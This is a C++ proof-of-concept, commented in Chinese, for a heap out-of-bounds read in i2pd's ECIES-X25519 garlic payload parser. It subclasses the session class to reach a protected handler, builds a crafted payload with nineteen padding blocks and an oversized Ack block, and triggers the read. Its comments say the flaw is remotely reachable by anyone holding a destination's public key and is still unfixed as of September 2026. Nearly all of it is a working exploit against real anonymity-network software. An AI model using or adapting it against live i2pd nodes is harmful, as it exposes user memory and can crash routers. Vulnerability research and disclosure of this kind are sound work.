// PoC-C2: i2pd ECIES-X25519 garlic HandlePayload 块边界检查错误 → 堆 OOB 读
// 漏洞: ECIESX25519AEADRatchetSession.cpp:404 (2.61.0)
//   if (size > len)   ← 错误: 应为 offset + size > len
// 块声明 size ≤ len 但 offset 已推进, 处理器从 buf+offset 读 size 字节 → 越界读
// 远程路径: 任何知道目标 destination 公钥者(所有发布过 LeaseSet 的服务/客户端)
//   → ECIES NewSession/Existing garlic 消息 → 解密 → HandlePayload → OOB
// dev HEAD (2026-09) 仍未修复
#include "ECIESX25519AEADRatchetSession.h"
#include "Garlic.h"
#include "Crypto.h"
#include "Log.h"

#include <cstdio>
#include <cstring>
#include <vector>
#include <memory>

// HandlePayload 是 protected —— 子类公开之
class EvilECIESSession: public i2p::garlic::ECIESX25519AEADRatchetSession
{
	public:
		EvilECIESSession (i2p::garlic::GarlicDestination * owner):
			ECIESX25519AEADRatchetSession (owner, false) {}
		void CallHandlePayload (const uint8_t * buf, size_t len)
		{
			HandlePayload (buf, len, nullptr, 0);
		}
};

int main ()
{
	i2p::log::Logger().SetLogLevel ("error");
	i2p::crypto::InitCrypto (false);

	EvilECIESSession session (nullptr);

	// 构造精确尺寸的堆缓冲 (模拟解密后的 garlic payload vector, 生产代码中为精确 resize)
	// 布局: 19 个 5 字节 DateTime 块 (推进 offset 至 95) + 1 个恶意 Ack 块
	// 恶意块: [type=Ack][be16 size=len=100] → 处理器从 buf+98 读 4×(100/4)=100 字节 → 98 字节 OOB
	const size_t len = 100;
	std::vector<uint8_t> payload (len, 0);
	size_t off = 0;
	for (int i = 0; i < 19; i++)
	{
		payload[off] = 0;             // eECIESx25519BlkDateTime
		payload[off+1] = 0; payload[off+2] = 2;  // size = 2
		// 2 字节 body (任意)
		off += 5;
	}
	printf ("[*] offset after %d benign blocks = %zu\n", 19, off);
	// 恶意 Ack 块: size 声明为 len (== len, 通过错误的 "size > len" 检查)
	payload[off] = 8;                            // eECIESx25519BlkAck
	payload[off+1] = (uint8_t)(len >> 8); payload[off+2] = (uint8_t)(len & 0xff); // size = 100
	printf ("[*] malicious Ack block at offset %zu, declared size=%zu (offset+size=%zu > len=%zu)\n",
		off, len, off + 3 + len, len);
	printf ("[*] handler will read %zu ack entries = %zu bytes from buf+%zu\n", len >> 2, (len >> 2) * 4, off + 3);
	printf ("[*] OOB read span: %zu bytes past heap buffer end\n", (off + 3 + (len >> 2) * 4) - len);
	fflush (stdout);

	session.CallHandlePayload (payload.data (), payload.size ());

	printf ("[!] HandlePayload returned without ASan report (unexpected)\n");
	return 0;
}
